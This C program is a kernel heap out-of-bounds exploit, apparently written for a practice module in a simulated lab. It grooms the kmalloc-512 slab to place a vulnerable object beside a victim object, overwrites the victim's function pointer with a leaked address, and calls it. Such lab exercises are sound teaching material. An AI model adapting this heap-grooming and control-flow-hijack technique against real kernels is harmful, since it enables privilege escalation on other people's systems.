#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "heap_api.h"

static unsigned long get_bad_addr(void) {
    FILE *fp = popen("dmesg | grep 'bad func'", "r");
    if (!fp) return 0;
    char line[256];
    unsigned long addr = 0;
    while (fgets(line, sizeof(line), fp)) {
        char *p = strstr(line, "bad func: 0x");
        if (p) {
            sscanf(p, "bad func: 0x%lx", &addr);
        }
    }
    pclose(fp);
    return addr;
}

#define PROBE_MAX 64

static int helper(heap_ctx_t *ctx, int *out_lo, int *out_hi) {
    int handles[PROBE_MAX];
    unsigned long addrs[PROBE_MAX];
    int n = 0;

    while (n < PROBE_MAX) {
        if (heap_alloc_dummy(ctx, 1, &handles[n]) < 0) {
            return -1;
        }
        if (heap_get_addr(ctx, HEAP_OBJ_DUMMY, handles[n], &addrs[n]) < 0) {
            return -1;
        }

        for (int k = 0; k < n; k++) {
            unsigned long a = addrs[k], b = addrs[n];
            int ha = handles[k], hb = handles[n];

            if ((a & ~0xFFFUL) != (b & ~0xFFFUL)) continue;

            if (a + BUF_SIZE == b) { *out_lo = ha; *out_hi = hb; return 1; }
            if (b + BUF_SIZE == a) { *out_lo = hb; *out_hi = ha; return 1; }
        }
        n++;
    }
    return 0;
}

int main() {
    const char *device_path = HEAP_DEFAULT_DEVICE;
    heap_ctx_t ctx = { .fd = -1 };
    int idx_lo, idx_hi;
    int vul_idx, victim_idx;

    printf("[*] Kernel OOB Exploit with CONFIG_FREELIST_RANDOM on Simulation\n");

    unsigned long bad_func_addr = get_bad_addr();
    if (bad_func_addr == 0) {
        printf("[-] Failed to find bad_function address from dmesg.\n");
        printf("[-] Ensure the module is loaded and dmesg has the address.\n");
        return -1;
    }
    printf("[+] Found bad_function address: 0x%lx\n", bad_func_addr);

    if (heap_open(&ctx, device_path) < 0) {
        return 1;
    }

    printf("[+] Defragmenting kmalloc-512...\n");
    if(heap_defrag(&ctx, "kmalloc-512") < 0) {
        printf("[-] defrag failed\n");
        heap_close(&ctx);
        return 1;
    }
    
    // 不断分配dummy_obj，直到找到两个相邻的dummy_obj
    if (helper(&ctx, &idx_lo, &idx_hi) != 1) {
        printf("[-] failed to find adjacent dummy pair\n");
        heap_close(&ctx);
        return 1;
    }

    printf("[+] Found two adjacent dummy_obj: low=%d  high=%d\n", idx_lo, idx_hi);
    
    // 依次释放这两个相邻的dummy_obj
    heap_free_dummy(&ctx, idx_hi);
    heap_free_dummy(&ctx, idx_lo);

    // 依次分配一个vul_obj和一个victim_obj，这样恰好相邻
    heap_alloc_vul(&ctx, 1, &vul_idx);
    heap_alloc_victim(&ctx, 1, &victim_idx);

    printf("[+] Dumping victim before overwrite...\n");
    display_victim(&ctx, victim_idx);

    printf("[+] Executing original funptr...\n");
    if (heap_execute_victim(&ctx, victim_idx) < 0) {
        heap_close(&ctx);
        return -1;
    }

    printf("[+] Overwriting funptr with bad_function address...\n");
    for (int i = 0; i < (int)sizeof(unsigned long); i++) {
        char b = (char)((bad_func_addr >> (i * 8)) & 0xFF);
        if (heap_write_vul(&ctx, vul_idx, 512 + i, b) < 0) {
            heap_close(&ctx);
            return -1;
        }
    }
    printf("[+] Overwrite done.\n");

    printf("[+] Dumping victim after overwrite...\n");
    display_victim(&ctx, victim_idx);

    printf("[+] Executing hijacked funptr...\n");
    if (heap_execute_victim(&ctx, victim_idx) < 0) {
        heap_close(&ctx);
        return -1;
    }

    heap_close(&ctx);
    return 0;
}
